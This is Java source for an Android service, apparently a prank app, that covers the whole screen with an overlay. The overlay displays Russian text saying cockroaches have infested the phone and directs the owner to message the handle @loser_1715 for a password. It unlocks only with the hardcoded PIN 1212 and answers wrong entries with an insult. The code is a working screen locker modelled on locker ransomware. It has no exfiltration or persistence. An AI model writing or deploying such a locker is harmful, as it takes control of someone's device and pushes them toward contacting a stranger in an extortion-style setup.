package com.example.safeprank;

import android.app.Service;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.text.InputFilter;
import android.text.InputType;
import android.view.Gravity;
import android.view.WindowManager;
import android.view.inputmethod.EditorInfo;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.FrameLayout;
import android.widget.TextView;

public class OverlayService extends Service {
    private WindowManager windowManager;
    private FrameLayout panel;
    private int dp(float n) { return (int)(n * getResources().getDisplayMetrics().density + 0.5f); }
    private GradientDrawable background(int color, int radius) {
        GradientDrawable shape = new GradientDrawable();
        shape.setColor(color);
        shape.setCornerRadius(dp(radius));
        return shape;
    }
    private void add(LinearLayout root, android.view.View v, int height, int top) {
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(-1, height < 0 ? height : dp(height));
        p.topMargin = dp(top);
        root.addView(v, p);
    }
    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        if (panel != null) return START_NOT_STICKY;
        if (!Settings.canDrawOverlays(this)) { stopSelf(); return START_NOT_STICKY; }
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        FrameLayout screen = new FrameLayout(this);
        screen.setBackgroundColor(Color.rgb(20, 25, 43));
        ScrollView scroll = new ScrollView(this);
        scroll.setFillViewport(true);
        screen.addView(scroll);
        LinearLayout view = new LinearLayout(this);
        view.setOrientation(LinearLayout.VERTICAL);
        view.setGravity(Gravity.CENTER);
        view.setPadding(dp(20), dp(72), dp(20), dp(16));
        scroll.addView(view);
        TextView title = new TextView(this);
        title.setText("🔒");
        title.setTextSize(20);
        title.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        title.setTextColor(Color.WHITE);
        add(view, title, -2, 20);
        TextView note = new TextView(this);
        note.setText("В ВАШ ТЕЛЕФОН ЗАСЕЛИЛИСЬ ТАРАКАНЫ, ЗА ПАРОЛЕМ ПИШИ: @loser_1715.");
        note.setTextColor(Color.rgb(185, 195, 216));
        note.setTextSize(14);
        add(view, note, -2, 8);
        TextView passwordHint = new TextView(this);
        passwordHint.setText("Пароль: УЗНАЙ В ПОИСАНИИ");
        passwordHint.setTextColor(Color.WHITE);
        passwordHint.setTextSize(18);
        passwordHint.setTypeface(Typeface.DEFAULT, Typeface.BOLD);
        add(view, passwordHint, -2, 12);
        EditText input = new EditText(this);
        input.setSingleLine(true);
        input.setTextColor(Color.WHITE);
        input.setHintTextColor(Color.rgb(159, 171, 195));
        input.setHint("Пароль");
        input.setInputType(InputType.TYPE_CLASS_NUMBER | InputType.TYPE_NUMBER_VARIATION_PASSWORD);
        input.setFilters(new InputFilter[]{new InputFilter.LengthFilter(4)});
        input.setImeOptions(EditorInfo.IME_ACTION_DONE);
        input.setPadding(dp(12), 0, dp(12), 0);
        input.setBackground(background(Color.rgb(39, 48, 70), 9));
        add(view, input, 48, 12);
        TextView status = new TextView(this);
        status.setTextColor(Color.rgb(255, 159, 159));
        add(view, status, -2, 4);
        Button check = new Button(this);
        check.setText("Проверить");
        check.setAllCaps(false);
        add(view, check, 48, 4);
        Runnable verify = () -> {
            if ("1212".equals(input.getText().toString())) stopSelf();
            else status.setText("ХУЙ ТАМ");
        };
        check.setOnClickListener(v -> verify.run());
        input.setOnEditorActionListener((v, actionId, event) -> {
            if (actionId == EditorInfo.IME_ACTION_DONE) { verify.run(); return true; }
            return false;
        });
        int type = Build.VERSION.SDK_INT >= 26 ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE;
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.CENTER;
        if (Build.VERSION.SDK_INT >= 28) {
            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }
        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE | WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN;
        try {
            windowManager.addView(screen, params);
            panel = screen;
        } catch (RuntimeException e) {
            stopSelf();
        }
        return START_NOT_STICKY;
    }
    @Override public void onDestroy() {
        if (panel != null) {
            try { windowManager.removeView(panel); } catch (IllegalArgumentException ignored) {}
            panel = null;
        }
        super.onDestroy();
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}
